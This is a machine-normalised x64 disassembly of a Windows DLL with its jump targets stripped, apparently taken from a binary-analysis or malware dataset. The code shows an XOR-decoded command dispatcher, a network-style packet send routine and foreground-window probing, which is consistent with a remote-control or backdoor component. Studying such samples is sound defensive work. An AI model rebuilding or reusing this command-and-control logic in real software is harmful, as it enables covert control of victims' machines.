cmp [ rbx + 0x28 ] ebp
jne r-xdata
mov rcx [ rbx + 0x78 ]
call sub_10007c80
test eax eax
jle r-xdata
cmp [ rbx + 0x28 ] ebp
jne r-xdata
mov r8d esi
movsxd rdx edi
mov rcx rbx
sub r8d edi
add rdx r13
call sub_100047c0
test eax eax
jle r-xdata
add edi eax
cmp edi esi
jl r-xdata
sub_10004910
sub rsp 0x28
mov [ rsp + 0x38 ] rbx
movsxd rbx [ rcx + 0x98 ]
mov [ rsp + 0x40 ] rsi
movsxd rsi r8d
mov [ rsp + 0x48 ] rdi
mov rax rdx
cmp ebx esi
mov rdi rcx
jl r-xdata
test ebx ebx
jle r-xdata
mov rdx [ rcx + 0x90 ]
mov r8 rsi
mov rcx rax
call memcpy
add [ rdi + 0x90 ] rsi
sub [ rdi + 0x98 ] esi
mov rdx [ rdi + 0x90 ]
jne r-xdata
mov rcx [ rdi + 0x80 ]
mov rsi [ rsp + 0x40 ]
mov [ rdi + 0x98 ] 0x0
mov [ rdi + 0x90 ] rcx
mov rdi [ rsp + 0x48 ]
mov eax ebx
mov rbx [ rsp + 0x38 ]
add rsp 0x28
retn
mov rdx [ rcx + 0x90 ]
mov r8 rbx
mov rcx rax
call memcpy
mov rax [ rdi + 0x88 ]
sub rax rdx
cmp rax 0x64
jge r-xdata
mov rax [ rdi + 0x80 ]
mov [ rdi + 0x90 ] rax
mov eax esi
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x28
retn
mov eax esi
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x28
retn
movsxd r8 [ rdi + 0x98 ]
mov rcx [ rdi + 0x80 ]
call memcpy
mov r11 [ rdi + 0x80 ]
mov [ rdi + 0x90 ] r11
sub_10004a60
sub rsp 0x38
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
movsxd rdi r9d
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x28 ] r13
mov r13 rcx
lea rcx [ rdi + 0x10 ]
mov r12 r8
mov rbp rdx
call ??2@YAPEAX_K@Z
test rax rax
mov rbx rax
je r-xdata
mov r13 [ rsp + 0x28 ]
mov r12 [ rsp + 0x30 ]
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x38
retn
mov r10d [ rbp ]
mov r8 rdi
mov rdx r12
mov [ rax ] r10d
mov r9d [ rbp + 0x4 ]
mov [ rax + 0x4 ] r9d
mov ecx [ rbp + 0x8 ]
mov [ rax + 0x8 ] ecx
mov ecx [ rbp + 0xc ]
mov [ rax + 0xc ] ecx
lea rcx [ rax + 0x10 ]
call memcpy
lea r8d [ rdi + 0x10 ]
mov rdx rbx
mov rcx r13
call sub_10004860
mov rcx rbx
call ??3@YAXPEAX@Z
sub_10004b40
sub rsp 0x78
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov eax [ rdx ]
lea r8 [ rsp + 0x30 ]
mov [ rsp + 0x22 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0xa014
mov [ rsp + 0x24 ] 0xc
mov [ r8 ] eax
mov eax [ rdx + 0x4 ]
mov [ r8 + 0x4 ] eax
mov eax [ rdx + 0x8 ]
lea rdx [ rsp + 0x20 ]
mov [ r8 + 0x8 ] eax
mov r8d 0x1c
call sub_10004860
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_10010a60
add rsp 0x78
retn
sub_10004bb0
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
mov [ rcx + 0x64 ] 0x0
mov rbx rcx
mov rcx [ rcx + 0x50 ]
mov [ rsp + 0x48 ] rdi
mov edi edx
test rcx rcx
je r-xdata
test edi edi
jle r-xdata
mov edx 0x1f40
call [ WaitForSingleObject@IAT ]
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
cmp [ rbx + 0x50 ] 0x0
jne r-xdata
mov edx edi
mov rcx rbx
call sub_10009b40
sub_10004c10
sub rsp 0x28
lea rax [ r--data ]
mov [ rsp + 0x40 ] rbx
mov rbx rcx
mov [ rcx ] rax
call sub_10004a30
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
mov edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x50 ]
test rcx rcx
je r-xdata
mov edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov edx 0xffffffff
call [ WaitForSingleObject@IAT ]
call sub_10004130
mov rcx [ rbx + 0x30 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x38 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x40 ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
mov [ rbx + 0x18 ] 0x0
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
call [ CloseHandle@IAT ]
mov [ rsp + 0x48 ] rdi
mov rdi [ rbx + 0x10 ]
test rdi rdi
je r-xdata
call sub_1000ce80
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x80 ]
call ??3@YAXPEAX@Z
lea rcx [ rbx + 0xa0 ]
call [ DeleteCriticalSection@IAT ]
lea rcx [ rbx + 0xc8 ]
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
jmp [ DeleteCriticalSection@IAT ]
mov rcx rdi
call sub_100062c0
mov rcx rdi
call ??3@YAXPEAX@Z
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
sub_10004d20
sub rsp 0x48
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x30 ] rsi
mov rbp rcx
add rcx 0xa0
mov [ rsp + 0x28 ] rdi
mov rsi r9
mov ebx edx
mov [ rsp + 0x20 ] r12
call [ EnterCriticalSection@IAT ]
xor edi edi
sub ebx 0x1
je r-xdata
mov r8d [ rsi + 0x8 ]
mov rdx [ rsi ]
mov rcx rbp
call sub_10004750
cmp ebx 0x1
jne r-xdata
lea rcx [ rbp + 0xa0 ]
call [ LeaveCriticalSection@IAT ]
mov r12 [ rsp + 0x20 ]
mov rsi [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x40 ]
mov eax edi
mov rdi [ rsp + 0x28 ]
add rsp 0x48
retn
mov r8d [ rsi + 0x8 ]
mov rdx [ rsi ]
mov rcx rbp
call sub_10004910
jmp r-xdata
mov edi eax
sub_10004db0
sub rsp 0x38
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
xor esi esi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x30 ] r12
cmp [ rcx + 0x68 ] esi
mov ebp r8d
mov r12 rdx
mov rdi rcx
mov ebx esi
jne r-xdata
cmp [ rdi + 0x68 ] 0x0
mov r12 [ rsp + 0x30 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
mov rbp [ rsp + 0x48 ]
mov eax 0xffffffff
cmovne ebx eax
mov eax ebx
mov rbx [ rsp + 0x40 ]
add rsp 0x38
retn
nop
cmp [ rdi + 0x28 ] 0x0
jne r-xdata
mov edx 0x2
movsxd rax ebp
lea r9 [ rsp + 0x20 ]
mov rcx rdi
mov r8d edx
mov [ rsp + 0x20 ] r12
mov [ rsp + 0x28 ] rax
call sub_10004d20
cmp eax ebp
je r-xdata
add ebx ebp
movsxd rcx eax
sub ebp eax
add ebx eax
add r12 rcx
mov ecx 0x2
call [ Sleep@IAT ]
add esi 0x1
cmp [ rdi + 0x68 ] 0x0
je r-xdata
cmp esi 0x2710
jge r-xdata
jmp r-xdata
sub_10004e70
mov [ rsp + 0x18 ] r8d
sub rsp 0x68
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x58 ] rbp
mov [ rsp + 0x50 ] rsi
mov rsi rcx
mov rbp r9
mov ebx edx
mov rcx [ rsi + 0x30 ]
mov edx 0xbb8
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
movzx eax [ rsp + 0x98 ]
mov [ rsp + 0x30 ] bx
mov ebx [ rsp + 0x90 ]
mov [ rsp + 0x32 ] ax
movsxd rax [ rsp + 0x80 ]
mov [ rsp + 0x48 ] rdi
test eax eax
mov [ rsp + 0x38 ] 0x0
jle r-xdata
lea rdx [ rsp + 0x30 ]
mov r9d ebx
mov r8 rbp
mov rcx rsi
mov [ rsp + 0x34 ] ebx
call sub_10004a60
cmp ebx 0x100
jge r-xdata
mov rcx rax
call ??2@YAPEAX_K@Z
test rax rax
mov rdi rax
jne r-xdata
mov [ rsp + 0x80 ] 0xffffffff
movsxd r8 [ rsp + 0x80 ]
xor edx edx
mov rcx rax
call memset
lea rdx [ rsp + 0x80 ]
mov r9d ebx
mov r8 rbp
mov rcx rdi
mov [ rsp + 0x20 ] 0x8
call sub_10011660
test eax eax
jne r-xdata
lea eax [ rdi - 0x1 ]
jmp r-xdata
mov rcx rdi
call ??3@YAXPEAX@Z
jmp r-xdata
mov r9d [ rsp + 0x80 ]
lea rdx [ rsp + 0x30 ]
mov r8 rdi
mov rcx rsi
mov [ rsp + 0x38 ] ebx
mov [ rsp + 0x34 ] r9d
call sub_10004a60
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rbx [ rsp + 0x60 ]
add rsp 0x68
retn
mov eax 0x1
sub_10004fa0
sub rsp 0x48
test edx edx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
movsxd rdi edx
mov rsi rcx
jle r-xdata
mov rdi [ rsp + 0x68 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x48
retn
lea eax [ rdi + 0x1 ]
mov [ rsp + 0x58 ] rbx
movsxd rcx eax
call ??2@YAPEAX_K@Z
test rax rax
mov rbx rax
je r-xdata
mov rbx [ rsp + 0x58 ]
mov r8d edi
mov rdx rax
mov rcx rsi
call sub_10004db0
cmp eax edi
je r-xdata
mov [ rdi + rbx ] 0x0
mov rcx [ rsi + 0x40 ]
test rcx rcx
je r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
xor ebx ebx
jmp r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
lea r9 [ rsp + 0x30 ]
mov r8d edi
mov rdx rbx
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x20 ] 0x0
call [ WriteFile@IAT ]
sub_10005040
sub rsp 0x48
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] rsi
mov [ rsp + 0x40 ] rdi
mov rdi rcx
xor esi esi
mov [ rsp + 0x24 ] esi
mov [ rsp + 0x20 ] si
lea r8d [ rsi + 0x4 ]
lea rdx [ rsp + 0x24 ]
call sub_10004db0
lea r8d [ rsi + 0x2 ]
lea rdx [ rsp + 0x20 ]
mov rcx rdi
call sub_10004db0
cmp [ rsp + 0x20 ] si
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x48
retn
cmp [ rsp + 0x24 ] esi
je r-xdata
mov rbx [ rdi + 0x10 ]
test rbx rbx
je r-xdata
mov ecx 0x30
call ??2@YAPEAX_K@Z
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rcx rbx
call sub_100062c0
mov rcx rbx
call ??3@YAXPEAX@Z
mov [ rdi + 0x10 ] rsi
mov r9 rdi
movzx r8d [ rsp + 0x20 ]
mov edx [ rsp + 0x24 ]
mov rcx rax
call sub_10005f80
mov rsi rax
sub_10005120
sub rsp 0x28
test edx edx
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] rdi
movsxd rdi edx
mov rsi rcx
jle r-xdata
test edx edx
jne r-xdata
lea eax [ rdi + 0x1 ]
mov [ rsp + 0x38 ] rbx
movsxd rcx eax
call ??2@YAPEAX_K@Z
test rax rax
mov rbx rax
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x28
retn
mov rcx [ rcx + 0x10 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x38 ]
mov r8d edi
mov rdx rax
mov rcx rsi
call sub_10004db0
cmp eax edi
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x28
jmp sub_100062f0
mov [ rdi + rbx ] 0x0
mov rcx [ rsi + 0x10 ]
test rcx rcx
je r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
xor ebx ebx
jmp r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
mov r8d edi
mov rdx rbx
call sub_10005fb0
sub_100051d0
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rdi
mov rdi rcx
mov ebx edx
call sub_10004c10
test bl 0x1
mov rbx [ rsp + 0x40 ]
je r-xdata
mov rax rdi
mov rdi [ rsp + 0x48 ]
add rsp 0x28
retn
mov rcx rdi
call ??3@YAXPEAX@Z
sub_10005210
mov eax 0x1078
call sub_10015ac0
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1050 ] rax
cmp [ rcx + 0x28 ] 0x0
mov [ rsp + 0x1088 ] rbx
mov [ rsp + 0x1060 ] r14
mov r14 [ rcx + 0x78 ]
mov rbx rcx
jne r-xdata
mov [ rcx + 0x70 ] 0x0
jmp r-xdata
mov [ rsp + 0x1090 ] rbp
mov [ rsp + 0x1098 ] rsi
mov [ rsp + 0x1070 ] rdi
mov [ rsp + 0x1068 ] r12
mov r14 [ rsp + 0x1060 ]
mov rbx [ rsp + 0x1088 ]
mov rcx [ rsp + 0x1050 ]
xor rcx rsp
call sub_10010a60
add rsp 0x1078
retn
test esi esi
jg r-xdata
movzx ecx [ rbx + 0x20 ]
nop
nop
nop
cmp esi 0x10
jne r-xdata
call [ rw-data ]
cmp eax 0x274c
jne r-xdata
xor [ rsp + rax + 0x50 ] cl
add rax 0x1
cmp rax rsi
jl r-xdata
xor ebp ebp
lea r12 [ rsp + 0x50 ]
cmp [ rbx + 0x28 ] ebp
jne r-xdata
cmp [ rbx + 0x98 ] 0x0
jne r-xdata
mov [ rbx + 0x68 ] 0x1
cmp [ rbx + 0x28 ] 0x0
je r-xdata
nop
nop
nop
cmp [ rsp + 0x50 ] 0xa023
jne r-xdata
lea rdx [ rsp + 0x50 ]
xor r9d r9d
mov r8d 0x1000
mov rcx r14
call [ rw-data ]
movsxd rsi eax
xor eax eax
test esi esi
jle r-xdata
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
mov [ rbx + 0x24 ] 0x1
mov rdi [ rsp + 0x1070 ]
mov rsi [ rsp + 0x1098 ]
mov rbp [ rsp + 0x1090 ]
mov r12 [ rsp + 0x1068 ]
mov [ rbx + 0x70 ] 0x0
cmp edi esi
je r-xdata
lea rdx [ rsp + 0x30 ]
mov r8d 0x10
mov rcx rbx
mov [ rsp + 0x30 ] 0xa012
mov [ rsp + 0x32 ] 0x1
call sub_10004860
lea r8d [ rax + 0x10 ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
lea ebp [ rax + 0x1 ]
mov [ rsp + 0x20 ] 0xa012
mov [ rsp + 0x22 ] ax
call sub_10004860
jmp r-xdata
mov ecx 0x2
call [ Sleep@IAT ]
add r12 rdi
sub esi edi
cmp [ rbx + 0x28 ] 0x0
je r-xdata
mov edx 0x1
movsxd rax esi
lea r9 [ rsp + 0x40 ]
lea r8d [ rdx + 0x1 ]
mov rcx rbx
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x48 ] rax
call sub_10004d20
test eax eax
movsxd rdi eax
jne r-xdata
jmp r-xdata
sub_10005400
sub rsp 0x58
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x78 ] rdi
mov rbx rcx
cmp [ rcx + 0x68 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
add rsp 0x58
retn
lea rsi [ __dos_header ]
xor edi edi
cmp eax 0x10
jne r-xdata
cmp [ rbx + 0x68 ] 0x0
je r-xdata
movzx eax [ rsp + 0x38 ]
add eax 0xffff601f
cmp eax 0x42
ja r-xdata
xor eax eax
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x3c ] eax
mov [ rsp + 0x40 ] eax
mov [ rsp + 0x44 ] eax
lea r8d [ rax + 0x10 ]
lea rdx [ rsp + 0x38 ]
mov rcx rbx
call sub_10004db0
test eax eax
js r-xdata
mov [ rbx + 0x68 ] 0x1
cdqe
movzx eax [ rsi + rax + 0x59d8 ]
mov ecx [ rsi + rax * 4 + 0x5944 ]
add rcx rsi
jmp rcx
mov [ rsp + 0x60 ] 0x1
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x1
lea r9 [ rsp + 0x60 ]
mov edx 0x9fe1
mov r8d 0xffffffff
mov rcx rbx
call sub_10004e70
jmp r-xdata
mov rcx rbx
call sub_1000b0e0
jmp r-xdata
mov ecx [ rsp + 0x3c ]
call sub_1000b590
jmp r-xdata
mov edx [ rsp + 0x3c ]
cmp edx 0x104
jae r-xdata
mov edx [ rsp + 0x3c ]
cmp edx 0x12c
jbe r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_10004bb0
jmp r-xdata
mov edx [ rsp + 0x3c ]
cmp edx 0x104
jae r-xdata
mov edx [ rsp + 0x3c ]
cmp edx 0x104
jae r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_1000b5d0
test eax eax
jns r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_1000ace0
test eax eax
jns r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_1000bff0
test eax eax
jns r-xdata
mov rcx rbx
call j_sub_100042d0
jmp r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_10004560
jmp r-xdata
mov ecx 0xa0
call ??2@YAPEAX_K@Z
mov [ rsp + 0x60 ] rax
test rax rax
je r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x30 ]
call [ SetEvent@IAT ]
mov edx [ rsp + 0x3c ]
cmp edx 0x104
jae r-xdata
mov rcx [ rbx + 0x30 ]
call [ SetEvent@IAT ]
mov edx [ rsp + 0x3c ]
cmp edx 0x208
jae r-xdata
mov rcx [ rbx + 0x40 ]
test rcx rcx
je r-xdata
cmp [ rsp + 0x3a ] 0x0
jne r-xdata
mov rcx rbx
call sub_10004b10
jmp r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_10004fa0
jmp r-xdata
cmp [ rsp + 0x3c ] 0x6
je r-xdata
mov edx [ rsp + 0x3c ]
test edx edx
jns r-xdata
mov rcx [ rbx + 0x10 ]
test rcx rcx
je r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_1000a4e0
jmp r-xdata
cmp [ rbx + 0x48 ] 0x0
jne r-xdata
mov [ rbx + 0x60 ] edi
jmp r-xdata
cmp [ rsp + 0x3c ] 0x0
jbe r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_10007ae0
jmp r-xdata
mov edx [ rsp + 0x3c ]
test edx edx
je r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_1000b450
jmp r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_10006a00
jmp r-xdata
mov [ rbx + 0x24 ] 0x1
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
test edx edx
je r-xdata
cmp [ rbx + 0x58 ] 0x0
jne r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
test edx edx
je r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
test edx edx
je r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
mov rax rdi
mov rcx rax
call sub_1000c8b0
jmp r-xdata
call sub_1000d010
mov rcx [ rbx + 0x8 ]
cmp [ rcx + 0x30 ] 0x0
je r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
test edx edx
je r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
test edx edx
je r-xdata
mov [ rw-data ] edi
mov rcx [ rbx + 0x30 ]
call [ SetEvent@IAT ]
jmp r-xdata
call [ CloseHandle@IAT ]
mov [ rbx + 0x40 ] rdi
mov rcx [ rbx + 0x30 ]
call [ SetEvent@IAT ]
jmp r-xdata
mov rcx [ rbx + 0x30 ]
call [ ResetEvent@IAT ]
jmp r-xdata
mov edx 0x6
mov rcx rbx
call sub_10005040
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
mov rcx rbx
call sub_10005120
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
call sub_10006240
jmp r-xdata
mov edx [ rsp + 0x3c ]
mov rcx rbx
call sub_1000a220
jmp r-xdata
cmp [ rbx + 0x18 ] 0x0
jne r-xdata
mov edx [ rsp + 0x3c ]
call sub_1000ed80
jmp r-xdata
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
mov [ rbx + 0x18 ] rdi
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
cmp edx 0x104
jae r-xdata
mov rcx rbx
call sub_10009cb0
test eax eax
jg r-xdata
mov rcx rbx
call sub_1000aac0
jmp r-xdata
mov rcx rbx
call sub_1000ab40
test eax eax
jns r-xdata
mov r8d [ rsp + 0x40 ]
mov rcx rbx
call sub_1000abf0
test eax eax
jns r-xdata
mov [ rbx + 0x8 ] rax
movzx r8d [ rsp + 0x3a ]
mov rdx rbx
mov rcx rax
call sub_1000d670
jmp r-xdata
call sub_1000ce80
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1000bab0
jmp r-xdata
mov rcx rbx
call sub_1000bd90
jmp r-xdata
mov ecx 0x38
call ??2@YAPEAX_K@Z
mov [ rsp + 0x60 ] rax
test rax rax
je r-xdata
mov rcx rbx
call sub_1000b390
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
mov [ rbx + 0x68 ] 0x1
jmp r-xdata
mov [ rbx + 0x8 ] rdi
jmp r-xdata
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
mov rax rdi
mov rdx rbx
mov rcx rax
call sub_1000d8f0
jmp r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov [ rbx + 0x18 ] rax
mov edx [ rsp + 0x3c ]
mov rcx rax
call sub_1000eb80
test eax eax
jne r-xdata
mov [ rbx + 0x18 ] rdi
jmp r-xdata
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
sub_10005a90
sub rsp 0x28
cmp [ rcx ] 0x20202020
mov [ rsp + 0x40 ] rbx
mov rbx rcx
jne r-xdata
movzx eax [ rbx ]
cmp al 0x20
je r-xdata
cmp [ rcx + 0x4 ] 0x20202020
jne r-xdata
add rbx 0x1
jmp r-xdata
cmp al 0x9
jne r-xdata
xor eax eax
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
cmp [ rbx ] 0x54
mov [ rsp + 0x48 ] rdi
jne r-xdata
xor eax eax
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
cmp [ rbx + 0x1 ] 0x43
jne r-xdata
cmp [ rbx + 0x2 ] 0x50
jne r-xdata
cmp [ rbx + 0x3 ] 0x20
jne r-xdata
add rbx 0x4
add rbx 0x1
jmp r-xdata
cmp al 0x9
jne r-xdata
movzx eax [ rbx ]
cmp al 0x20
je r-xdata
mov edx 0x20
mov rcx rbx
call [ strchr@IAT ]
test rax rax
mov r11 rax
je r-xdata
add rax 0xffffffffffffffff
cmp rax rbx
jbe r-xdata
cmp [ rax ] 0x3a
je r-xdata
cmp rax rbx
jbe r-xdata
sub rax 0x1
cmp rax rbx
ja r-xdata
add rax 0x1
cmp rax r11
jae r-xdata
lea rbx [ r11 + 0x1 ]
nop
nop
nop
add rbx 0x1
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp cl 0x39
jg r-xdata
movzx eax [ rbx ]
cmp al 0x20
je r-xdata
mov edx 0x20
mov rcx rbx
call [ strchr@IAT ]
test rax rax
mov rdi rax
je r-xdata
add rax 0x1
cmp rax r11
jb r-xdata
add rax 0xffffffffffffffff
cmp rax rbx
jbe r-xdata
movzx ecx [ rax ]
cmp cl 0x30
jl r-xdata
cmp [ rax ] 0x3a
je r-xdata
cmp rax rbx
jbe r-xdata
sub rax 0x1
cmp rax rbx
ja r-xdata
add rax 0x1
cmp rax rdi
mov rdx rax
jae r-xdata
xor eax eax
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
mov rcx rdx
call [ atoi@IAT ]
movzx ecx [ rw-data ]
cmp ecx eax
jne r-xdata
movzx ecx [ rax ]
cmp cl 0x30
jl r-xdata
lea rcx [ rdi + 0x1 ]
nop
cmp cl 0x39
jg r-xdata
add rcx 0x1
jmp r-xdata
cmp al 0x9
jne r-xdata
add rax 0x1
cmp rax rdi
jb r-xdata
movzx eax [ rcx ]
cmp al 0x20
je r-xdata
mov r9 [ rcx ]
lea r10 [ __dos_header ]
xor edx edx
cmp r9 [ r10 + 0x16608 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov r9w [ rcx + 0x8 ]
cmp r9w [ r10 + 0x16610 ]
jne r-xdata
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov eax 0x1
add rsp 0x28
retn
mov rax [ rcx ]
cmp rax [ r--data ]
je r-xdata
mov r9b [ rcx + 0xa ]
cmp r9b [ r10 + 0x16612 ]
jne r-xdata
cmp rax [ r10 + 0x165e8 ]
jne r-xdata
mov eax edx
jmp r-xdata
sbb edx edx
sbb edx 0xffffffff
mov r8b [ rcx + 0x8 ]
cmp r8b [ r10 + 0x165f0 ]
je r-xdata
test eax eax
je r-xdata
test edx edx
jne r-xdata
sub_10005cb0
mov [ rsp + 0x10 ] edx
mov rax rsp
sub rsp 0x58
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rbp
mov [ rax - 0x8 ] rsi
mov [ rax - 0x10 ] rdi
mov [ rax - 0x18 ] r12
mov [ rax - 0x20 ] r13
mov [ rax - 0x28 ] r14
mov [ rax - 0x30 ] r15
movsx r14d dx
movsx rsi dx
shr edx 0x10
xor r13d r13d
movsx eax dx
imul eax r14d
movsxd rdi eax
lea eax [ r14 + 0x1 ]
sub rdi rsi
add rdi rcx
movsxd rcx eax
mov r15 rdi
call ??2@YAPEAX_K@Z
movsx r12d [ rsp + 0x6a ]
test r12d r12d
mov rbp rax
mov ebx r13d
jle r-xdata
mov rcx rbp
call ??3@YAXPEAX@Z
mov r15 [ rsp + 0x28 ]
mov r14 [ rsp + 0x30 ]
mov r12 [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x78 ]
mov rbx [ rsp + 0x70 ]
mov eax r13d
mov r13 [ rsp + 0x38 ]
add rsp 0x58
retn
nop
nop
imul r14d ebx
lea rdx [ rsi + rdi ]
mov rcx rdi
movsxd r8 r14d
call memcpy
mov r8 rsi
mov edx 0x20
mov rcx r15
call memset
mov r13d 0x1
add ebx 0x1
sub rdi rsi
cmp ebx r12d
jl r-xdata
mov r8 rsi
mov rdx rdi
mov rcx rbp
call memcpy
mov rcx rbp
mov [ rsi + rbp ] r13b
call sub_10005a90
test eax eax
jne r-xdata
jmp r-xdata
sub_10005db0
mov r11 rsp
sub rsp 0xc8
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov [ r11 - 0x8 ] rdi
mov [ r11 - 0x18 ] r13
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
lea rcx [ r--data ]
mov [ r11 - 0x10 ] r12
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov r12 rax
call sub_10007c20
test r12 r12
je r-xdata
mov r12 [ rsp + 0xb8 ]
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_10010a60
mov rbx [ rsp + 0xd8 ]
mov rbp [ rsp + 0xe0 ]
mov rsi [ rsp + 0xe8 ]
mov rdi [ rsp + 0xc0 ]
mov r13 [ rsp + 0xb0 ]
add rsp 0xc8
retn
xor r13d r13d
mov ecx 0x64
call [ Sleep@IAT ]
call [ GetForegroundWindow@IAT ]
lea rdx [ rsp + 0x60 ]
mov rcx rax
mov r8d 0x40
mov rbx rax
mov [ rsp + 0x60 ] r13b
call [ GetClassNameA@IAT ]
lea rdx [ r--data ]
